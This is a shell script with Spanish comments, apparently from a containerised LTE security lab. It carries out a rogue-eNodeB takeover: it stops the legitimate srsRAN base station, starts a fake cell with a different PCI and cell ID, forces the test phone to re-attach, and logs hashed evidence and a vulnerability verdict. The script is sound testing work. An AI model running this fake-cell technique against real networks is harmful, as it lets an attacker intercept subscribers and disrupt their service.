#!/bin/sh
# ============================================================================
# v5_rogue.sh — V5 Rogue eNodeB (celda falsa sin SDR, CVSS ~7.x).
# Mecánica ZMQ: el rogue TOMA los puertos/IP del eNB legítimo (takeover del
# endpoint radio) con distinto PCI/cell_id. El UE re-selecciona y se attacha
# a la celda atacante: el MME lo ve con otro CellID.
# (Nota docs: la celda2 .14/PCI2 es LEGÍTIMA y no es el ataque; el rogue
#  reutiliza la IP/puertos de eNB1 .4 para el takeover.)
# Uso: ./v5_rogue.sh  (pregunta si restaurar al final)
# Requiere: lab UP. No tocar durante el ataque (60-90s por attach).
# Evidencia: results/v5_rogue_<TS>.log + hash (CellID antes/después).
# ============================================================================
set -eu
cd "$(dirname "$0")/.."
export MSYS_NO_PATHCONV=1

log() { echo "[v5] $*"; }
ask() {
  printf "%s [%s]: " "$2" "$3" >&2
  read -r ans || ans=""
  [ -n "$ans" ] || ans="$3"
  echo "$ans"
}
mkdir -p results .lab-tmp/rogue-enb; touch results/hashes.txt 2>/dev/null || true

# La celda 2 interfiere con la sincronizacion del UE1 durante el takeover.
# Se apaga para la prueba; al terminar, re-ejecutar lab-up o restaurar eNB2/UE2.
if [ "${STOP_ENB2:-yes}" = "yes" ]; then
  docker stop srsenb2 srsue2 >/dev/null 2>&1 || true
  log "eNB2/UE2 detenidos para evitar interferencia (STOP_ENB2=no para omitir)"
fi

RESTORE=${RESTORE:-}
ROGUE_PCI=${ROGUE_PCI:-}
ROGUE_CELL=${ROGUE_CELL:-}
[ -n "$RESTORE" ] || RESTORE=$(ask RESTORE "Restaurar eNB legítimo al final? (yes/no)" "yes")
[ -n "$ROGUE_PCI" ] || ROGUE_PCI=$(ask ROGUE_PCI "PCI de la celda falsa" "7")
[ -n "$ROGUE_CELL" ] || ROGUE_CELL=$(ask ROGUE_CELL "cell_id falsa (hex, ej 0x09)" "0x09")
TS=$(date -u +%Y%m%dT%H%M%SZ)
EVID="results/v5_rogue_$TS.log"
: > "$EVID"

RESTORED=no
restore_legit() {
  [ "$RESTORED" = "no" ] || return 0
  log "Restaurando eNB legítimo (trap)..."
  docker exec srsenb pkill -x srsenb >/dev/null 2>&1 || true
  sleep 60
  docker exec -d srsenb sh -c "cd /root/enb-config && srsenb enb.conf > /tmp/enb.log 2>&1"
  sleep 20
  docker exec srsue sh -c "pkill -9 -f 'srsue ue.conf' 2>/dev/null || true"
  sleep 2
  docker exec -d srsue sh -c "cd /root/ue-config && srsue ue.conf > /tmp/ue.log 2>&1"
  sleep 60
  RESTORED=yes
}
trap 'restore_legit' INT TERM

log "Celda legítima actual (MME):" | tee -a "$EVID"
docker logs open5gs 2>&1 | grep -a "001010123456789" | grep -a CellID | tail -n 1 | tee -a "$EVID" || log "(sin CellID aún; ver docker logs open5gs)"
log "UE actual (celda vista por el UE):" | tee -a "$EVID"
docker exec srsue sh -c "strings /tmp/ue.log 2>/dev/null | grep -a -E 'Found Cell|attach successful' | tail -n 2" | tee -a "$EVID" || true

log "Generando config rogue (mismos puertos ZMQ/IP .4, PCI $ROGUE_PCI, cell $ROGUE_CELL)..."
cp srsran/enb-config/enb.conf srsran/enb-config/sib.conf srsran/enb-config/rb.conf .lab-tmp/rogue-enb/
sed -e "s/cell_id = 0x01;/cell_id = $ROGUE_CELL;/" -e "s/pci = 1;/pci = $ROGUE_PCI;/" \
  srsran/enb-config/rr.conf > .lab-tmp/rogue-enb/rr.conf
grep -a -E "pci|cell_id" .lab-tmp/rogue-enb/rr.conf | tee -a "$EVID"
docker cp .lab-tmp/rogue-enb srsenb:/root/rogue-enb

log "Deteniendo eNB legítimo y levantando rogue..."
docker exec srsenb pkill -x srsenb >/dev/null 2>&1 || true
sleep 60
docker exec -d srsenb sh -c "cd /root/rogue-enb && srsenb enb.conf > /tmp/enb-rogue.log 2>&1"
sleep 20
docker exec srsue sh -c "pkill -9 -f 'srsue ue.conf' 2>/dev/null || true"
sleep 2
docker exec -d srsue sh -c "cd /root/ue-config && srsue ue.conf > /tmp/ue.log 2>&1"
sleep 70
log "--- UE tras rogue (attach?) ---" | tee -a "$EVID"
docker exec srsue sh -c "strings /tmp/ue.log | grep -a -E 'Found Cell|attach successful' | tail -n 2" | tee -a "$EVID" || log "(sin attach aún; esperar/reintentar)"
log "Celda vista por el MME ahora:" | tee -a "$EVID"
docker logs open5gs 2>&1 | grep -a "001010123456789" | grep -a CellID | tail -n 1 | tee -a "$EVID" || log "(revisar docker logs open5gs)"
NOW=$(docker logs open5gs 2>&1 | grep -a "001010123456789" | grep -a CellID | tail -n 1 || true)
echo "--- rogue PCI=$ROGUE_PCI cell=$ROGUE_CELL TS=$TS ---" >> "$EVID"
echo "$NOW" >> "$EVID"
H=$(sha256sum "$EVID" | cut -d' ' -f1)
echo "$H  $(basename "$EVID")  V5  $(date -u +%Y-%m-%dT%H:%M:%SZ)  rogue PCI $ROGUE_PCI cell $ROGUE_CELL" >> results/hashes.txt
log "hash registrado: $EVID"
UE_AFTER=$(docker exec srsue sh -c "strings /tmp/ue.log | grep -a -E 'Found Cell|attach successful' | tail -n 2" || true)
echo "$UE_AFTER" >> "$EVID"
echo "--- rogue PCI=$ROGUE_PCI cell=$ROGUE_CELL TS=$TS ---" >> "$EVID"
echo "$NOW" >> "$EVID"
if printf '%s\n' "$UE_AFTER" | grep -q "PCI=$ROGUE_PCI"; then
  log "VEREDICTO: VULNERABLE - UE sincronizado con PCI=$ROGUE_PCI"
  echo "VEREDICTO=VULNERABLE" >> "$EVID"
else
  log "VEREDICTO: NO REPRODUCIBLE - el UE no adquirio PCI=$ROGUE_PCI"
  echo "VEREDICTO=NO_REPRODUCIBLE" >> "$EVID"
fi

if [ "$RESTORE" = "yes" ]; then
  trap - INT TERM
  restore_legit
  log "Attach post-restore:" | tee -a "$EVID"
  docker logs open5gs 2>&1 | grep -a "001010123456789.*Attach complete" | tail -n 1 | tee -a "$EVID" || true
else
  log "Rogue dejado activo (RESTORE=no). Para restaurar: re-ejecutar con yes o ./lab-up.sh pasos 8-10."
  trap - INT TERM
fi
log "F4 contramedida: lista de celdas autorizadas / detección de PCI inesperado + re-ejecutar (se espera rechazo del attach rogue)."
